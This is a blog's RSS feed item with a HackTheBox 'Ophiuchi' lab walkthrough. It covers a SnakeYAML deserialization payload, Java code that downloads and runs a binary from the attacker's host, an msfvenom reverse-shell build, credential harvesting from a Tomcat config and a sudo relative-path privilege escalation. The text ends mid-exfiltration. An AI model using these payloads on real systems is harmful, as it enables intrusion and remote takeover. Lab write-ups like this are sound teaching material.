<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Golang on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/golang/</link>
    <description>Recent content in Golang on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 06 Aug 2021 17:52:28 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/golang/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Ophiuchi</title>
      <link>https://fahmifj.github.io/hackthebox/ophiuchi/</link>
      <pubDate>Fri, 06 Aug 2021 17:52:28 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/ophiuchi/</guid>
      <description>Deserialization attack on YAML and reversing web assembly</description>
      <content:encoded><![CDATA[<p>Ophiuchi starts off by enumerating a Java web application that offers a service for parsing YAML. The parser is vulnerable to YAML deserialization attack, and exploiting it results in an interactive shell access to the system. Internal enumeration of the system finds a set of user credentials. This user is allowed to run a specific Go program which loads a web assembly file and executes a script file if a certain condition is met. The program loads these files without their absolute path. As a result, the files could be replaced with malicious ones to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>YAML deserialization attack</li>
<li>Web Assembly (WASM)</li>
<li>Code Analysis (Go &amp; WASM)</li>
<li>Sudo exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Java Compiler</li>
<li><a href="https://github.com/artsploit/yaml-payload">Yaml-payload</a></li>
<li><a href="https://github.com/WebAssembly/wabt">Wabt</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan using <code>nmap</code> discovers 2 open ports: SSH on port 22 and an Apache Tomcat servlet on port 8080.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «ophiuchi» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ nmap -p- --reason -oA nmap/10-tcp-allport-ophiuchi 10.10.10.227                                           
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-17 10:09 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.227
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.056s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65533</span> resets
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE    REASON
</span></span><span class="line"><span class="cl">22/tcp   open  ssh        syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">8080/tcp open  http-proxy syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 77.26 seconds
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">→ root@kali «ophiuchi» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ nmap -p22,8080 -sC -sV -oA nmap/10-tcp-allport-scripts-ophiuchi 10.10.10.227
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-17 10:21 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.227
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.055s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">8080/tcp open  http    Apache Tomcat 9.0.38
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Parse YAML
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 9.35 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
<p>On port 8080, the machine hosts a site that serves a YAML parser service.</p>
<p><div class="img-container"><img src="imgs/image-20210617212718924.png" alt="image-20210617212718924"  /></div>
</p>
<p>When I submit a sample YAML payload, it returns the following message.</p>
<p><div class="img-container"><img src="imgs/image-20210729200644337.png" alt="image-20210729200644337"  /></div>
</p>
<p>But, if I send an invalid payload, for example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">test: test
</span></span><span class="line"><span class="cl">  test: test
</span></span></code></pre></div><p>I get the following results:</p>
<p><div class="img-container"><img src="imgs/image-20210729200616087.png" alt="image-20210729200616087"  /></div>
</p>
<p>From the error above, I noticed the <code>org.yaml.snake.yaml.load</code> package is being used. This package is typically used for <a href="https://www.baeldung.com/java-snake-yaml#basic-usage">YAML deserialization</a>.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-tomcat">Shell as tomcat</h3>
<h4 id="snakeyaml-insecure-deserialization---poc">SnakeYAML Insecure Deserialization - PoC</h4>
<p>Although the web app said the parser feature is temporarily on hold, I&rsquo;m sure that each payload I submit is being processed on the backend.</p>
<p>Searching on Google  about the Snake YAML deserialization attack, I came across <a href="https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html">this post</a> . I took the payload from that post and modified the URL to point to my HTB IP. I will setup a netcat listener and submit the payload to the parser.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="cp">!!javax.script.ScriptEngineManager</span><span class="w"> </span><span class="p">[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="cp">!!java.net.URLClassLoader</span><span class="w"> </span><span class="p">[[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cp">!!java.net.URL</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;http://10.10.14.23/iamf&#34;</span><span class="p">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">]]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">]</span><span class="w">
</span></span></span></code></pre></div><p>On my listener, I get the following request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «ophiuchi» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">80</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">53002</span>
</span></span><span class="line"><span class="cl">GET /iamf HTTP/1.1
</span></span><span class="line"><span class="cl">User-Agent: Java/11.0.8
</span></span><span class="line"><span class="cl">Host: 10.10.14.23
</span></span><span class="line"><span class="cl">Accept: text/html, image/gif, image/jpeg, *<span class="p">;</span> <span class="nv">q</span><span class="o">=</span>.2, */*<span class="p">;</span> <span class="nv">q</span><span class="o">=</span>.2
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210729202237145.png" alt="image-20210729202237145"  /></div>
</p>
<p>That means the parser is vulnerable to insecure deserialization attack!</p>
<h4 id="snakeyaml-insecure-deserialization---weaponize">SnakeYAML Insecure Deserialization - Weaponize</h4>
<p>The researcher on the previous post uses a <code>.jar</code> payload from <a href="https://github.com/artsploit/yaml-payload">this Github repo</a> to get a code execution. I will clone that repo to my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ git clone https://github.com/artsploit/yaml-payload.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> yaml-payload
</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;yaml-payload&#39;</span>...
</span></span><span class="line"><span class="cl">remote: Enumerating objects: 10, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">remote: Total <span class="m">10</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">10</span>
</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span>.
</span></span></code></pre></div><p>From that repo, I will modify the codes of <code>AwesomeScriptEngineFactory.java</code> file to make it executes a sequence OS commands that will grab my malicious binary and execute it afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">artsploit</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.script.ScriptEngine</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.script.ScriptEngineFactory</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">AwesomeScriptEngineFactory</span> <span class="kd">implements</span> <span class="n">ScriptEngineFactory</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">AwesomeScriptEngineFactory</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;wget http://10.10.14.23/iamf-shell -O /tmp/iamf-shell;&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;chmod +x /tmp/iamf-shell&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;/tmp/iamf-shell&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="o">...[</span><span class="n">SNIP</span><span class="o">]...</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>Next, I will compile the code and pack the whole <code>src/</code> folder into a java archive (jar) file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «yaml-payload» «10.10.14.23» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$  javac src/artsploit/AwesomeScriptEngineFactory.java <span class="o">&amp;&amp;</span> jar -cvf yaml-payload.jar -C src/ .
</span></span><span class="line"><span class="cl">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span class="o">=</span>on -Dswing.aatext<span class="o">=</span><span class="nb">true</span>
</span></span><span class="line"><span class="cl">adding: META-INF/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: META-INF/MANIFEST.MF <span class="o">(</span><span class="nv">in</span><span class="o">=</span>56<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>56<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: ./ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: META-INF/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: META-INF/services/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: META-INF/services/javax.script.ScriptEngineFactoed -5%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: artsploit/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: artsploit/AwesomeScriptEngineFactory.class <span class="o">(</span><span class="nv">in</span><span class="o">=</span>1%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: artsploit/AwesomeScriptEngineFactory.java~ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>5<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: artsploit/AwesomeScriptEngineFactory.java <span class="o">(</span><span class="nv">in</span><span class="o">=</span>16<span class="o">)</span>
</span></span><span class="line"><span class="cl">Total:
</span></span><span class="line"><span class="cl">------
</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nv">in</span> <span class="o">=</span> 4083<span class="o">)</span> <span class="o">(</span><span class="nv">out</span> <span class="o">=</span> 2846<span class="o">)</span> <span class="o">(</span>deflated 30%<span class="o">)</span>
</span></span></code></pre></div><p>Then I will create my malicious binary using <code>msfvenom</code>. This binary along with the jar will be hosted using a Python web server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.23 <span class="nv">lport</span><span class="o">=</span><span class="m">53</span> -f elf -o iamf-shell
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">74</span> bytes
</span></span><span class="line"><span class="cl">Final size of elf file: <span class="m">194</span> bytes
</span></span><span class="line"><span class="cl">Saved as: iamf-shell
</span></span></code></pre></div><p>Finally, I will setup a netcat listener and submit the following payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="cp">!!javax.script.ScriptEngineManager</span><span class="w"> </span><span class="p">[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="cp">!!java.net.URLClassLoader</span><span class="w"> </span><span class="p">[[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cp">!!java.net.URL</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;http://10.10.14.23/yaml-payload.jar&#34;</span><span class="p">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">]]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">]</span><span class="w">
</span></span></span></code></pre></div><p>Within a few seconds, I get an interactive shell as tomcat.</p>
<p><div class="img-container"><img src="imgs/image-20210729220701287.png" alt="image-20210729220701287"  /></div>
</p>
<h4 id="shell-upgrade">Shell Upgrade</h4>
<p>As usual, I will do the PTY trick to upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">which script
</span></span><span class="line"><span class="cl">/usr/bin/script                                                     
</span></span><span class="line"><span class="cl">script /dev/null -c bash                                            
</span></span><span class="line"><span class="cl">Script started, file is /dev/null                                   
</span></span><span class="line"><span class="cl">tomcat@ophiuchi:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">tomcat@ophiuchi:/$ ^Z 
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span>  + <span class="m">7400</span> suspended  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span>  - <span class="m">7400</span> continued  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">tomcat@ophiuchi:/$ stty rows <span class="m">30</span> cols <span class="m">126</span>
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-admin">Shell as admin</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There are only two users in this machine who have login shell: <code>root</code> and <code>admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">tomcat@ophiuchi:/opt/tomcat$ cat /etc/passwd <span class="p">|</span> grep sh$
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">admin:x:1000:1000:,,,:/home/admin:/bin/bash
</span></span></code></pre></div><p>Using <code>grep</code> to search for a &ldquo;password&rdquo; recursively on the tomcat home directory (<code>/opt/tomcat</code>) reveals a set of credentials for user <code>admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">tomcat@ophiuchi:/opt/tomcat$ grep -Ri <span class="s2">&#34;password&#34;</span> 
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">conf/tomcat-users.xml:&lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">&#34;admin&#34;</span> <span class="nv">password</span><span class="o">=</span><span class="s2">&#34;whythereisalimit&#34;</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">&#34;manager-gui,admin-gui&#34;</span>/&gt;     ...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h4 id="ssh---admin">SSH - admin</h4>
<p>The password <code>whythereisalimit</code>  works on SSH for user <code>admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ ssh admin@10.10.10.227 
</span></span><span class="line"><span class="cl">admin@10.10.10.227<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-51-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:             0.08
</span></span><span class="line"><span class="cl">  Usage of /:              19.9% of 27.43GB
</span></span><span class="line"><span class="cl">  Memory usage:            17%
</span></span><span class="line"><span class="cl">  Swap usage:              0%
</span></span><span class="line"><span class="cl">  Processes:               <span class="m">214</span>
</span></span><span class="line"><span class="cl">  Users logged in:         <span class="m">0</span>
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> ens160: 10.10.10.227
</span></span><span class="line"><span class="cl">  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:90cf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Mon Jan <span class="m">11</span> 08:23:12 <span class="m">2021</span> from 10.10.14.2
</span></span><span class="line"><span class="cl">admin@ophiuchi:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span>
</span></span></code></pre></div><p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <code>admin</code> is allowed to run a Go program as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">admin@ophiuchi:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> admin on ophiuchi:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User admin may run the following commands on ophiuchi:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
</span></span></code></pre></div><h4 id="source-code-analysis---indexgo">Source Code Analysis - index.go</h4>
<p>What <code>index.go</code> does is:</p>
<ul>
<li>It reads a web assembly file called <code>main.wasm</code> and creates an instance of that file.</li>
<li>It then exports a function called &ldquo;info&rdquo; from the instance and executes it. If the results of that function is &ldquo;1&rdquo;, it runs the <code>deploy.sh</code> file.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;fmt&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">wasm</span> <span class="s">&#34;github.com/wasmerio/wasmer-go/wasmer&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;os/exec&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;log&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">bytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nf">ReadBytes</span><span class="p">(</span><span class="s">&#34;main.wasm&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">instance</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nf">NewInstance</span><span class="p">(</span><span class="nx">bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">defer</span> <span class="nx">instance</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nx">init</span> <span class="o">:=</span> <span class="nx">instance</span><span class="p">.</span><span class="nx">Exports</span><span class="p">[</span><span class="s">&#34;info&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">result</span><span class="p">,</span><span class="nx">_</span> <span class="o">:=</span> <span class="nf">init</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nx">f</span> <span class="o">:=</span> <span class="nx">result</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">f</span> <span class="o">!=</span> <span class="s">&#34;1&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Not ready to deploy&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Ready to deploy&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nx">out</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="s">&#34;deploy.sh&#34;</span><span class="p">).</span><span class="nf">Output</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Also, it&rsquo;s important to note that this <code>index.go</code> loads  <code>deploy.sh</code> and <code>main.wasm</code> with relative path. The <code>deploy.sh</code> and <code>main.wasm</code> themself can be found under <code>/opt/wasm-functions</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">admin@ophiuchi:/opt/wasm-functions$ ls -lah
</span></span><span class="line"><span class="cl">total 3.9M
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">5</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> ..
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> backup
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">88</span> Oct <span class="m">14</span>  <span class="m">2020</span> deploy.sh
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root 2.5M Oct <span class="m">14</span>  <span class="m">2020</span> index
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root root  <span class="m">522</span> Oct <span class="m">14</span>  <span class="m">2020</span> index.go
</span></span><span class="line"><span class="cl">-rwxrwxr-x <span class="m">1</span> root root 1.5M Oct <span class="m">14</span>  <span class="m">2020</span> main.wasm
</span></span></code></pre></div><p>The <code>deploy.sh</code> contains a to-do note of a lazy admin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ToDo</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Create script to automatic deploy our new web at tomcat port 8080</span>
</span></span></code></pre></div><p>From here, I will exfil the entire <code>/opt/wasm-functions/</code> to my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">admin@ophiuchi:/opt$ tar -czvf /tmp/wasm-functions.tar.gz wasm-functions/
</span></span><span class="line"><span class="cl">wasm-functions/
</span></span><span class="line"><span class="cl">wasm-functions/index
